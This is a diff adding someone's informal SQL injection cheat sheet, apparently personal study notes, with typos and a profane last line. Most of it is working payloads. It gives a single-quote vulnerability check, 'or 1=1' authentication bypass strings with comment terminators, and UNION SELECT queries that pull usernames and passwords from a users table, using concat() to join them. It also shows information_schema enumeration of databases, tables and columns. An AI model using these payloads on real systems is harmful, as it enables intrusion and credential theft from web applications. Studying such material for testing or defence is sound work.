@@ -1,0 +1,51 @@
+sql injection
+always use one quote ' to check whther its vulnerable or not
+
+
+///authentication bypass:
+username; user
+pass; test'OR '1
+{one quote terminates the where OR helps in adding clause)
+
+///commenting o ut query
+[hashing]
+for input use 
+' or '1' = '1' --
+::
+' or '1' = '1'#
+
+for url
+' or '1' = '1' --+
+
+
+//union
+col in first=col in second;;;;;;;;;;;;;;;;;;;;;;;;;;;
+use union 
+eg. ' UNION SELECT username, password FROM users--+
+
+For usernames:
+id=1’ UNION SELECT 1,2,username,4 from users--+
+
+For passwords:
+id=1’ UNION SELECT 1,2,password,4 from users--+
+
+But with concat(), you can get both in a single column like this:
+id=1’ UNION SELECT 1,2,concat(username,password),4 from users--+
+
+Note that there will be no space in between them but you can add a dash with this:
+id=1’ UNION SELECT 1,2,concat(username,’ - ’,password),4 from users--+
+
+GROUP_CONCAT
+The GROUP_CONCAT() function in MySQL is used to concatenate data from multiple rows into one field.
+
+w union use some of the following
+ 
+select database()--->databaseresult
+select table_name from information_schema.tables where table_schema="databaseresult"-->nameeeeeeee
+
+select coloumn_name from information_schema.columns WHERE table_schema="databaseresult" and table_name="nameeeeeeeeee"
+
+
+------------>>> gives coloumn names
+
+fuck around andf ind out
